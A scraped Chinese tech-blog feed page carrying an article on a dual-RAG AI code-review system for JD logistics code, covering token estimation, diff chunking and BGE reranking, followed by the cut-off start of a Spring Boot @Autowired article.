                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作者：齐海智</p>
<h2 data-id="heading-0">大促备战中的代码评审困境与破局</h2>
<p>双十一大促是系统稳定性的终极“大考”。为规避上线风险，技术侧会启动系统封板管控，主动将非紧急需求的发布窗口前置。这一举措在保障系统稳定性的同时，也必然导致研发需求的前置与集中，使得封板前的代码评审任务量显著增加。我们面临着一个严峻的“量与质”的挑战：</p>
<blockquote>
<p>如何在时间紧、任务重的双重压力下，确保代码评审的效率与质量，从而前置发现潜在风险，有效拦截线上BUG？</p>
</blockquote>
<p>传统的代码评审模式在此场景下效率低、质量差（风险遗漏的可能性高），而现有的AI辅助工具又因误报率高而陷入尴尬：产生的多数评审意见并无实质帮助，工程师仍需花费大量时间进行判断与筛选。</p>
<p>正是在此背景下，【供应链技术部-商家导入研发组】在AI代码评审方面进行了一些探索，尝试将知识工程代码知识检索能力与AutoBots（已更名为：JoyAgent）知识库检索能力相结合，构建了一套代码评审系统。这套双RAG架构为我们的代码评审工作提供了一些新思路，在此分享出来，希望与各位同行交流探讨，共同进步。</p>
<h2 data-id="heading-1">现有技术方案的局限性</h2>
<h3 data-id="heading-2">技术1：基于流水线的AI代码评审方案</h3>
<p><strong>核心技术路径</strong>： 在通过公共流程（Webhook触发、解析MR、获取Diff）得到代码变更内容后，该方案的核心处理流程如下：</p>
<p>1.<strong>文件类型过滤</strong>：仅保留.java、.yaml和.md文件进行后续分析，并明确优先级的处理顺序。</p>
<p>2.<strong>上下文截断</strong>：为避免触及大模型上下文窗口上限，采用了一种基于固定行数的上下文截断策略。该策略仅截取代码变更处附近预设行数（如10行）的文本内容。</p>
<p>3.<strong>Prompt驱动评审</strong>：将经过过滤和截断后的代码片段，与预设的评审规则Prompt组合，发送给通用大语言模型。</p>
<p>4.<strong>输出评审意见</strong>：解析大模型的返回结果，通过coding平台API将评审结果添加到MR中。</p>
<p><strong>核心问题识别</strong>：</p>
<p>1.<strong>全局上下文缺失</strong>：其采用的“固定行数截断”策略是导致问题的根本原因之一。这使得评审完全丧失了项目架构、模块依赖和完整业务逻辑的视野，如同“管中窥豹”，评审深度和准确性受到严重制约。</p>
<p>2.<strong>提示词天花板</strong>：所有评审规则与知识硬编码于Prompt中，规则膨胀后极易触及模型上下文长度上限，可维护性与扩展性差。</p>
<p>3.<strong>知识无法沉淀</strong>：效果提升完全依赖于“更换更强的基础模型”与“调整Prompt”，自身缺乏可持续积累、沉淀和复用领域知识的机制。</p>
<h3 data-id="heading-3">技术2：基于JoyAgent知识库的RAG代码评审</h3>
<p><strong>核心技术路径</strong>： 在通过公共流程获取代码差异后，该方案的核心流程如下：</p>
<p>1.知识归纳：将格式化后的Diff内容发送给JoyAgent，由LLM智能体对其进行初步的“知识归纳”，以理解此次变更的核心意图。</p>
<p>2.规则检索：基于归纳出的知识，通过RAG机制从自定义知识库中召回相关的代码评审规则。此知识库支持在线文档（Joyspace）、离线文档（PDF/Word）等多种格式。该方案的核心灵活性在于其“自定义知识库绑定”机制。接入者可以在JoyAgent平台上自定义智能体，通过工作流绑定自定义知识库。这使得在召回评审规则时，系统能动态地查找并应用接入者自定义的评审规则，从而实现了无需修改Prompt即可定制评审规则的能力。</p>
<p>3.行级评审：JoyAgent将代码Diff与召回的具体规则相结合，再次调用LLM进行精确评审。利用Git Diff信息中包含的代码行信息，能够将评审意见精准关联到具体的代码行。</p>
<p>4.输出结果：直接使用JoyAgent的输出结果，通过coding平台API将评审结果添加到MR中。</p>
<p><strong>核心问题识别</strong>：</p>
<p>1.<strong>知识归纳失真</strong>：核心问题源于其“知识归纳”步骤。该步骤依赖底层大模型对Code Diff进行总结，此过程不稳定，经常遗漏或曲解原始代码变更的关键上下文，导致后续流程建立在一个不完整或失真的信息基础之上。</p>
<p>2.<strong>检索与生成联动失效</strong>：基于失真的知识归纳结果进行RAG检索，导致召回的规则与真实代码场景匹配度低。此外，检索结果未经有效的重排序，直接与不完整的代码上下文一并送入大模型，这使得模型缺乏进行准确判断的可靠依据，最终必然生成大量不可靠甚至错误的评审意见。</p>
<h2 data-id="heading-4">从线上问题到技术突破</h2>
<h3 data-id="heading-5">问题1：三方系统空值处理异常</h3>
<p><strong>示例：</strong></p>
<pre><code class="hljs language-vbscript" lang="vbscript">// 问题代码：三方系统地址编码字段处理
<span class="hljs-built_in">request</span>.setAddressCode(String.valueOf(address.getCode()));
// 当address.getCode()为<span class="hljs-literal">null</span>时，String.valueOf(<span class="hljs-literal">null</span>)返回<span class="hljs-string">"null"</span>字符串
// 导致三方系统Integer.parse<span class="hljs-built_in">Int</span>(<span class="hljs-string">"null"</span>)抛出NumberFormatException
</code></pre>
<p><strong>技术1的问题</strong>：</p>
<p>理论上，可以通过在Prompt中硬编码“三方接口地址编码须为数字类型字符串” 的规则来识别此问题。然而，随着业务场景增多，所有规则都被挤压在有限的上下文窗口内竞争。当代码变更触发自动压缩（如截断至10行）时，被保留的上下文具有极大的随机性，与当前评审强相关的评审规则很可能被其他无关规则挤掉或因自动压缩而被截掉，导致其无法被稳定触发，从而漏报。</p>
<p><strong>技术2的问题</strong>：</p>
<p>该方案虽然理论上能够通过知识库检索到相关规则，但其不稳定的知识归纳过程导致代码上下文的理解时好时坏，使得规则检索的准确性波动较大。同时，未对检索结果进行重排序，进一步放大了这种不确定性。最终，由于缺乏稳定、可靠的上下文支撑，系统无法持续、准确地识别此类问题，其评审结果表现出显著的随机性。</p>
<h3 data-id="heading-6">问题2：EDI项目中的语法错误</h3>
<p><strong>示例：</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 错误：使用变量而非字面常量 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">case</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"${orderType}"</span>&gt;</span>
<span class="hljs-comment">&lt;!-- 正确应使用字面值：&lt;case value="NORMAL"&gt; --&gt;</span>
</code></pre>
<p><strong>EDI平台介绍：</strong></p>
<p>EDI（电子数据交换）是用来解决京东物流与多样化商家系统间的对接难题的技术，其关键功能包括<strong>协议转换、数据格式转换、数据校验和流程编排</strong>。这意味着EDI配置文件必须严格遵守预定义的语法和标准，任何偏差都可能导致平台的核心转换与校验功能失效。</p>
<p><strong>技术1的问题</strong>：</p>
<p>由于其缺乏对EDI配置语法与规范的领域知识，如果自定义规则，会遇到问题1一样的提示词天花板和上下文截断的问题。</p>
<p><strong>技术2的问题</strong>：</p>
<p>除了上面提到的知识归纳过程的不稳定问题，技术2也面临一个更前置的的挑战：它缺乏对项目身份的感知能力。系统在处理一个XML配置文件时，无法自动识别它隶属于“EDI项目”而非普通Java应用。因此，在后续的RAG检索过程中，它极有可能使用通用的Java代码评审规则，而无法精准命中“EDI专用配置规范”这一关键上下文，导致检索方向错误，最终无法识别出必须使用字面常量这一特定于EDI领域的合规性要求。</p>
<h3 data-id="heading-7">解决方案：双RAG架构</h3>
<p>﻿</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1838f43ed42e416aa7a4ab110f569293~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593021&amp;x-signature=CP%2Bb2sLTGzq4dINYMaOb6iga7H4%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<h4 data-id="heading-8">1. 识别项目类型</h4>
<p>•<strong>特征识别</strong>：基于文件扩展名（.flow, .dt）进行精准判断。</p>
<p>•<strong>优先级设定</strong>：EDI项目识别优先于普通JAVA项目，确保领域特殊性得到优先处理。</p>
<p>•<strong>策略影响</strong>：项目类型直接决定后续<strong>评审规则的选择</strong>与<strong>RAG知识库的检索策略</strong>，从源头保障了评审的针对性。</p>
<h4 data-id="heading-9">2. 代码分块处理</h4>
<p><strong>2.1 Token估算算法</strong></p>
<p>由于我们使用的底层大模型是JoyAI，并没有公开tokenizer的细节，根据<a href="https://link.juejin.cn?target=http%3A%2F%2Fdocs.chatrhino.jd.com%2Ftokenizers%2F" target="_blank" title="http://docs.chatrhino.jd.com/tokenizers/" ref="nofollow noopener noreferrer">官网文档</a>提供的token计算API： <a href="https://link.juejin.cn?target=http%3A%2F%2Fapi.chatrhino.jd.com%2Fapi%2Fv1%2Ftokenizer%2Festimate-token-count" target="_blank" title="http://api.chatrhino.jd.com/api/v1/tokenizer/estimate-token-count" ref="nofollow noopener noreferrer">api.chatrhino.jd.com/api/v1/toke…</a></p>
<p>测试了几组数据：</p>













































































<table><thead><tr><th>测试文本</th><th>字符长度</th><th>实际Token数</th><th>内容Token增量</th></tr></thead><tbody><tr><td>空字符串</td><td>0</td><td>63</td><td>0</td></tr><tr><td>"a"</td><td>1</td><td>64</td><td>+1</td></tr><tr><td>"hello"</td><td>5</td><td>64</td><td>+1</td></tr><tr><td>"code"</td><td>4</td><td>64</td><td>+1</td></tr><tr><td>"hello world"</td><td>11</td><td>65</td><td>+2</td></tr><tr><td>"测试"</td><td>2</td><td>64</td><td>+1</td></tr><tr><td>"编程编程"</td><td>4</td><td>65</td><td>+2</td></tr><tr><td>"测试测试测试测试测试"</td><td>10</td><td>68</td><td>+5</td></tr><tr><td>"hello世界"</td><td>7</td><td>65</td><td>+2</td></tr><tr><td>"programming代码"</td><td>13</td><td>66</td><td>+3</td></tr><tr><td>重复"programming代码"3次</td><td>39</td><td>72</td><td>+9</td></tr></tbody></table>
<p><strong>推导过程</strong></p>
<p>通过分析测试数据，我们发现了以下关键规律：</p>
<p>1.基础系统开销：所有请求都有63 tokens的固定开销</p>
<p>2.英文单词分级：</p>
<p>◦1-5字符单词 = 1 token（"a"、"hello"、"code"）</p>
<p>◦6-10字符单词 ≈ 2 tokens（推测值）</p>
<p>◦11+字符单词 = 3 tokens（"programming"）</p>
<p>3.中文分词规则：每2个中文字符 = 1 token</p>
<p>4.空格处理：空格作为分隔符，不增加额外token</p>
<p>5.混合内容：按字符类型分段计算后求和</p>
<p>基于上述规律，我们构建了以下估算公式：</p>
<pre><code class="hljs language-diff" lang="diff">总Tokens = 63 + ∑(单词token)

单词token计算：
<span class="hljs-deletion">- 单字符单词: 1 token</span>
<span class="hljs-deletion">- 英文单词(≤5字符): 1 token  </span>
<span class="hljs-deletion">- 英文单词(6-10字符): 2 tokens</span>
<span class="hljs-deletion">- 英文单词(≥11字符): 3 tokens</span>
<span class="hljs-deletion">- 中文文本: (字符数 + 1) / 2 tokens</span>
<span class="hljs-deletion">- 混合内容: 分段计算后求和</span>
</code></pre>
<p><strong>2.2 分块阈值与安全设计</strong></p>
<p>•触发阈值：当预估Token数 &gt; 100,000时，自动触发分块处理流程。</p>
<p>◦JoyAI的上下文窗口是<a href="https://link.juejin.cn?target=http%3A%2F%2Fdocs.chatrhino.jd.com%2Fhttp%2F" target="_blank" title="http://docs.chatrhino.jd.com/http/" ref="nofollow noopener noreferrer">128K</a>，由于JoyAI没说明1K是1024还是1000，保守估计使用1000</p>
<p>◦128K = 128000，为了避免超过上下文窗口，留个富余量，使用80%，12800*0.8=102400 ≈100000</p>
<p>﻿</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55065fb2c42349f393086615f39cee9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593021&amp;x-signature=zQaHqt8KIyI50m3gy4jnQQs3Ek0%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>•单块容量：设定 MAX_TOKENS_PER_CHUNK = 60000，为模型输出及上下文预留40%的安全余量。</p>
<p>•设计理念：通过严格的容量控制，确保单次处理负载均在模型窗口的安全范围内。</p>
<p><strong>2.3 智能分块策略</strong></p>
<p>系统采用两级分块策略，确保代码语义的完整性：</p>
<p><strong>2.3.1 文件级分割</strong></p>
<p>通过git diff指令识别文件边界，确保单个文件的代码完整性，避免跨文件分割。</p>
<pre><code class="hljs language-css" lang="css">Pattern<span class="hljs-selector-class">.compile</span>("diff <span class="hljs-attr">--git</span> <span class="hljs-selector-tag">a</span>/(.+?) <span class="hljs-selector-tag">b</span>/(.+?)\n") 
</code></pre>
<p><strong>2.3.2 代码结构感知分割</strong></p>
<p>利用方法签名模式识别代码结构边界：</p>
<pre><code class="hljs language-ini" lang="ini">Pattern <span class="hljs-attr">methodPattern</span> = Pattern.compile(
 "(<span class="hljs-section">[+-]</span>\s*((public|private|protected)\s+)?(\w+\s+)?\w+\s*\(<span class="hljs-section">[^)]</span>*\)\s*\{)",Pattern.MULTILINE)<span class="hljs-comment">;</span>
</code></pre>
<p>在方法或类的自然边界处进行分割，最大限度保持代码块的语义完整性。</p>
<h4 data-id="heading-10">3. RAG增强与重排序机制</h4>
<p><strong>3.1 基于知识工程的代码片段、业务上下文的检索</strong></p>
<p>在 RAG增加服务中实现多维度检索增强：</p>
<p>•业务领域识别：基于代码内容识别是仓业务（WMS）、仓配接入业务（ECLP）、转运中心业务（TC）等。</p>
<p>•关键词提取与过滤：从变更文件中提取并净化关键术语。</p>
<p>•通过执行语义搜索。</p>
<p>重排序优化：对检索结果使用BGE模型进行重排序，提升相关性。</p>
<p><strong>3.2 重排序</strong></p>
<p>在RAG系统中，检索（召回）这一步通常使用向量相似度搜索。这种方法追求的是高召回率——即尽可能不遗漏任何可能相关的文档。但这就带来了一个问题：</p>
<p>◦数量过多：可能会返回大量候选文档，全部送入大模型会导致超过上下文窗口限制，成本高昂且速度慢。</p>
<p>◦质量不均：向量搜索是基于语义相似度，但“相似”不一定等于“有用”。它可能会召回一些：</p>
<p>▪主题相关但内容泛泛的文档。</p>
<p>▪包含关键词但逻辑不匹配的文档。</p>
<p>▪相关性排名不高但实际至关重要的“珍宝”文档。</p>
<p>例如检索“如何做番茄炒蛋”，向量相似度查询结果可能会找到：</p>
<p>◦《番茄炒蛋的最正宗做法》 （极度相关，排名第一）</p>
<p>◦《100道家常菜谱》 （相关，但范围太广）</p>
<p>◦《鸡蛋的营养价值》 （部分相关）</p>
<p>◦《番茄种植指南》 （仅关键词相关，实际无用）</p>
<p>如果不经处理，把这四篇文档塞给大模型，模型需要费力地从大量文本中辨别哪些是真正有用的信息，不仅增加了Token消耗，更严重的是，无关信息会形成“噪声”，干扰模型的判断，导致生成质量下降——模型幻觉。</p>
<p>为了节省成本，我们使用了本地重排序方案：</p>
<p>◦模型文件: bge-reranker-base.onnx (<a href="https://link.juejin.cn?target=https%3A%2F%2Fbge-model.com%2Ftutorial%2F1_Embedding%2F1.2.1.html" target="_blank" title="https://bge-model.com/tutorial/1_Embedding/1.2.1.html" ref="nofollow noopener noreferrer">BGE</a>重排序模型)</p>
<p>◦分词器: HuggingFaceTokenizer</p>
<p>◦运行时: ONNX Runtime Java API</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 核心流程</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Map</span>.<span class="hljs-property">Entry</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Float</span>&gt;&gt; <span class="hljs-title function_">rerankBatch</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> query, List&lt;<span class="hljs-built_in">String</span>&gt; documents</span>) {
 <span class="hljs-comment">// 1. 文本预处理和分词</span>
 <span class="hljs-comment">// 2. 构建查询-文档对</span>
 <span class="hljs-comment">// 3. ONNX模型推理</span>
 <span class="hljs-comment">// 4. 相关性评分计算</span>
 <span class="hljs-comment">// 5. 按分数降序排序</span>
 <span class="hljs-comment">// 6. 返回排序结果</span>
}
</code></pre>
<p>示例：</p>
<p>﻿</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d7242aeb7994d769a534fcf93f1d8c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593021&amp;x-signature=GIWf0M4%2B9hfQF5Z6kTytnqcrZiM%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<h4 data-id="heading-11">4. 实际应用效果验证</h4>
<p><strong>案例1：成功预防空值处理事故</strong></p>
<p>﻿</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d2930bd90b2440aa97c72a324acdbfb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593021&amp;x-signature=3xT6V9I5y3Asyas84V38D0heafw%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p><strong>案例2：EDI配置规范检查</strong></p>
<p>﻿</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/160fab01cd9b406ab7d45a78689af637~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593021&amp;x-signature=k4vKjJLdCmXNrMizEc8BgkMXCrU%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>﻿</p>
<h2 data-id="heading-12">总结与展望</h2>
<p>我们探索出的双RAG架构，其价值核心并非追求极致的简单或敏捷，而是它既能像资深的一线研发一样，深度理解业务及代码变更的具体语境与潜在影响，又能像严谨的架构师一样，严格遵循成文的规范与最佳实践。</p>
<p>通过结构化的协同机制，系统将两种不同质、不同源的知识（深度的代码语义与精准的评审规则）进行融合，实现了 “1+1 &gt; 2” 的智能涌现，从而具备了识别并预防那些复杂、隐蔽代码缺陷的深度推理能力。这正是我们在高并发、高可用要求极为严苛的大促等场景下，为夯实系统稳定性基石所做出的关键性架构决策。</p>
<p>这一成功实践，为我们奠定了代码评审工作中坚实的技术基石，并清晰地指明了未来的演进路径：</p>
<p>1.<strong>迈向多模态代码理解</strong>：从纯文本代码评审，扩展至对架构图、时序图等非结构化设计产物的理解与合规性检查。</p>
<p>2.<strong>构建全域业务知识库</strong>：自动抓取并融合产品经理的历史PRD、设计文档等非技术知识，将其转化为知识工程中的关键上下文。这使得AI在评审时，不仅能理解“代码怎么写”，更能判断“代码为何而写”，实现对业务意图的精准校验，从源头规避偏离产品设计的实现。</p>
<p>3.<strong>实现需求上下文的自动关联</strong>：通过规范研发流程，约束在提交代码时于commit信息中嵌入需求编号。系统在评审时自动提取该编号，并主动获取对应的PRD详情。这使得每一次代码评审都能够在完整的业务背景中进行，AI能够直接对照需求文档，判断代码实现是否完整、准确地满足了所有功能点与业务规则，提供前更加精准的上下文。</p>
<p>虽然探索的道路并非坦途，我们曾在具体的技术细节中陷入困境，例如，为了在 CentOS 7.9 的环境中支持高版本 ONNX 运行时以启用重排序功能，不得不手动编写docker脚本从源码编译高版本的cglib依赖。这段经历，恰恰印证了弗雷德里克·布鲁克斯在《人月神话》中所揭示的那句箴言：</p>
<blockquote>
<p>The only way to accelerate software work is to simplify the product and the process, and to face the essential complexity of the software task itself with courage and skill.</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot 为何不推荐使用@Autowired]]></title>    <link>https://juejin.cn/post/7597622924272123931</link>    <guid>https://juejin.cn/post/7597622924272123931</guid>    <pubDate>2026-01-21T09:35:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597622924272123931" data-draft-id="7597622924272107547" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot 为何不推荐使用@Autowired"/> <meta itemprop="keywords" content="Spring Boot"/> <meta itemprop="datePublished" content="2026-01-21T09:35:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="闲煮光阴"/> <meta itemprop="url" content="https://juejin.cn/user/1523239911963420"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot 为何不推荐使用@Autowired
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1523239911963420/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    闲煮光阴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:35:19.000Z" title="Wed Jan 21 2026 09:35:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 